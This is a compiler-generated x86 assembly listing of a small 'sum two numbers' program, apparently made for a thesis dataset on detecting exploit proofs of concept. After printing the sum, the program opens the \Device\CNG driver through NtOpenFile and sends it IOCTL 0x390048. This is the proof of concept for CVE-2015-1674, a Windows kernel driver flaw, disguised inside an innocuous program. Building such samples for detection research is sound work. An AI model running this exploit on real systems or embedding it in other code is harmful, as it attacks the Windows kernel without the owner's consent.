; Listing generated by Microsoft (R) Optimizing Compiler Version 19.28.29913.0 

	TITLE	C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_37052_cve_id_CVE-2015-1674_sum.obj
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	___local_stdio_printf_options
PUBLIC	___local_stdio_scanf_options
PUBLIC	__vfprintf_l
PUBLIC	_printf
PUBLIC	__vfscanf_l
PUBLIC	_scanf
PUBLIC	_main
EXTRN	__imp__CloseHandle@4:PROC
EXTRN	__imp__GetLastError@0:PROC
EXTRN	__imp__DeviceIoControl@32:PROC
EXTRN	__imp__GetProcAddress@8:PROC
EXTRN	__imp__LoadLibraryA@4:PROC
EXTRN	_exit:PROC
EXTRN	_RtlInitUnicodeString@8:PROC
EXTRN	___acrt_iob_func:PROC
EXTRN	_getchar:PROC
EXTRN	___stdio_common_vfprintf:PROC
EXTRN	___stdio_common_vfscanf:PROC
_DATA	SEGMENT
COMM	?_OptionsStorage@?1??__local_stdio_printf_options@@9@9:QWORD							; `__local_stdio_printf_options'::`2'::_OptionsStorage
COMM	?_OptionsStorage@?1??__local_stdio_scanf_options@@9@9:QWORD							; `__local_stdio_scanf_options'::`2'::_OptionsStorage
_DATA	ENDS
_DATA	SEGMENT
$SG98711 DB	0aH, 'Enter two no: ', 00H
$SG98712 DB	'%d %d', 00H
	ORG $+2
$SG98713 DB	'Sum : %d', 00H
	ORG $+3
$SG98714 DB	'ntdll.dll', 00H
	ORG $+2
$SG98715 DB	'NtOpenFile', 00H
	ORG $+1
$SG98717 DB	'\', 00H, 'D', 00H, 'e', 00H, 'v', 00H, 'i', 00H, 'c', 00H
	DB	'e', 00H, '\', 00H, 'C', 00H, 'N', 00H, 'G', 00H, 00H, 00H
$SG98720 DB	'File successfully opened.', 0aH, 00H
	ORG $+1
$SG98721 DB	'File could not be opened.', 0aH, 00H
	ORG $+1
$SG98724 DB	'[*]Send IOCTL fail!', 0aH, 00H
	ORG $+3
$SG98725 DB	'[*]Error Code:%d', 0aH, 00H
	ORG $+2
$SG98726 DB	'[*]0x%08x', 0aH, 00H
_DATA	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_obja$ = -80						; size = 24
_iostatusblock$ = -56					; size = 8
_filename$ = -48					; size = 8
_bRet$ = -40						; size = 4
_dwCnt$ = -36						; size = 4
_stat$ = -32						; size = 4
_hModule$ = -28						; size = 4
_sum$ = -24						; size = 4
_b$ = -20						; size = 4
_a$ = -16						; size = 4
_NtOpenFileStruct$ = -12				; size = 4
_hCNG$ = -8						; size = 4
_dwBuffer$ = -4						; size = 4
_argc$ = 8						; size = 4
_argv$ = 12						; size = 4
_main	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_37052_cve_id_CVE-2015-1674_sum.c
; Line 11
	push	ebp
	mov	ebp, esp
	sub	esp, 80					; 00000050H
; Line 13
	push	OFFSET $SG98711
	call	_printf
	add	esp, 4
; Line 14
	lea	eax, DWORD PTR _b$[ebp]
	push	eax
	lea	ecx, DWORD PTR _a$[ebp]
	push	ecx
	push	OFFSET $SG98712
	call	_scanf
	add	esp, 12					; 0000000cH
; Line 15
	mov	edx, DWORD PTR _a$[ebp]
	add	edx, DWORD PTR _b$[ebp]
	mov	DWORD PTR _sum$[ebp], edx
; Line 16
	mov	eax, DWORD PTR _sum$[ebp]
	push	eax
	push	OFFSET $SG98713
	call	_printf
	add	esp, 8
; Line 21
	push	OFFSET $SG98714
	call	DWORD PTR __imp__LoadLibraryA@4
	mov	DWORD PTR _hModule$[ebp], eax
; Line 22
	push	OFFSET $SG98715
	mov	ecx, DWORD PTR _hModule$[ebp]
	push	ecx
	call	DWORD PTR __imp__GetProcAddress@8
	mov	DWORD PTR _NtOpenFileStruct$[ebp], eax
; Line 23
	cmp	DWORD PTR _NtOpenFileStruct$[ebp], 0
	jne	SHORT $LN2@main
; Line 24
	push	-1
	call	_exit
$LN2@main:
; Line 30
	push	OFFSET $SG98717
	lea	edx, DWORD PTR _filename$[ebp]
	push	edx
	call	_RtlInitUnicodeString@8
; Line 34
	mov	DWORD PTR _obja$[ebp+12], 64		; 00000040H
; Line 35
	lea	eax, DWORD PTR _filename$[ebp]
	mov	DWORD PTR _obja$[ebp+8], eax
; Line 36
	mov	DWORD PTR _obja$[ebp], 24		; 00000018H
; Line 37
	mov	DWORD PTR _obja$[ebp+4], 0
; Line 38
	mov	DWORD PTR _obja$[ebp+16], 0
; Line 39
	mov	DWORD PTR _obja$[ebp+20], 0
; Line 42
	mov	DWORD PTR _hCNG$[ebp], 0
; Line 43
	push	32					; 00000020H
	push	7
	lea	ecx, DWORD PTR _iostatusblock$[ebp]
	push	ecx
	lea	edx, DWORD PTR _obja$[ebp]
	push	edx
	push	1048577					; 00100001H
	lea	eax, DWORD PTR _hCNG$[ebp]
	push	eax
	call	DWORD PTR _NtOpenFileStruct$[ebp]
	mov	DWORD PTR _stat$[ebp], eax
; Line 44
	cmp	DWORD PTR _stat$[ebp], 0
	jl	SHORT $LN3@main
; Line 45
	push	OFFSET $SG98720
	call	_printf
	add	esp, 4
; Line 46
	jmp	SHORT $LN4@main
$LN3@main:
; Line 48
	push	OFFSET $SG98721
	call	_printf
	add	esp, 4
; Line 49
	or	eax, -1
	jmp	SHORT $LN7@main
$LN4@main:
; Line 51
	mov	DWORD PTR _dwBuffer$[ebp], 0
; Line 52
	mov	DWORD PTR _dwCnt$[ebp], 0
; Line 53
	push	0
	lea	ecx, DWORD PTR _dwCnt$[ebp]
	push	ecx
	push	4
	lea	edx, DWORD PTR _dwBuffer$[ebp]
	push	edx
	push	4
	lea	eax, DWORD PTR _dwBuffer$[ebp]
	push	eax
	push	3735624					; 00390048H
	mov	ecx, DWORD PTR _hCNG$[ebp]
	push	ecx
	call	DWORD PTR __imp__DeviceIoControl@32
	mov	DWORD PTR _bRet$[ebp], eax
; Line 54
	cmp	DWORD PTR _bRet$[ebp], 0
	jne	SHORT $LN5@main
; Line 56
	push	OFFSET $SG98724
	call	_printf
	add	esp, 4
; Line 57
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG98725
	call	_printf
	add	esp, 8
; Line 58
	jmp	SHORT $LN6@main
$LN5@main:
; Line 61
	mov	edx, DWORD PTR _dwBuffer$[ebp]
	push	edx
	push	OFFSET $SG98726
	call	_printf
	add	esp, 8
$LN6@main:
; Line 63
	mov	eax, DWORD PTR _hCNG$[ebp]
	push	eax
	call	DWORD PTR __imp__CloseHandle@4
; Line 64
	call	_getchar
; Line 65
	xor	eax, eax
$LN7@main:
; Line 66
	mov	esp, ebp
	pop	ebp
	ret	0
_main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _scanf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Format$ = 8						; size = 4
_scanf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 1282
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 1285
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 1286
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	push	0
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	__vfscanf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 1287
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 1288
	mov	eax, DWORD PTR __Result$[ebp]
; Line 1289
	mov	esp, ebp
	pop	ebp
	ret	0
_scanf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vfscanf_l
_TEXT	SEGMENT
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
__Locale$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vfscanf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 1064
	push	ebp
	mov	ebp, esp
; Line 1065
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	___local_stdio_scanf_options
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	mov	edx, DWORD PTR [eax]
	push	edx
	call	___stdio_common_vfscanf
	add	esp, 24					; 00000018H
; Line 1068
	pop	ebp
	ret	0
__vfscanf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _printf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Format$ = 8						; size = 4
_printf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 956
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 959
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 960
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	push	1
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	__vfprintf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 961
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 962
	mov	eax, DWORD PTR __Result$[ebp]
; Line 963
	mov	esp, ebp
	pop	ebp
	ret	0
_printf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vfprintf_l
_TEXT	SEGMENT
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
__Locale$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vfprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 644
	push	ebp
	mov	ebp, esp
; Line 645
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	___local_stdio_printf_options
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	mov	edx, DWORD PTR [eax]
	push	edx
	call	___stdio_common_vfprintf
	add	esp, 24					; 00000018H
; Line 646
	pop	ebp
	ret	0
__vfprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ___local_stdio_scanf_options
_TEXT	SEGMENT
___local_stdio_scanf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 100
	push	ebp
	mov	ebp, esp
; Line 102
	mov	eax, OFFSET ?_OptionsStorage@?1??__local_stdio_scanf_options@@9@9 ; `__local_stdio_scanf_options'::`2'::_OptionsStorage
; Line 103
	pop	ebp
	ret	0
___local_stdio_scanf_options ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ___local_stdio_printf_options
_TEXT	SEGMENT
___local_stdio_printf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 90
	push	ebp
	mov	ebp, esp
; Line 92
	mov	eax, OFFSET ?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 ; `__local_stdio_printf_options'::`2'::_OptionsStorage
; Line 93
	pop	ebp
	ret	0
___local_stdio_printf_options ENDP
_TEXT	ENDS
END
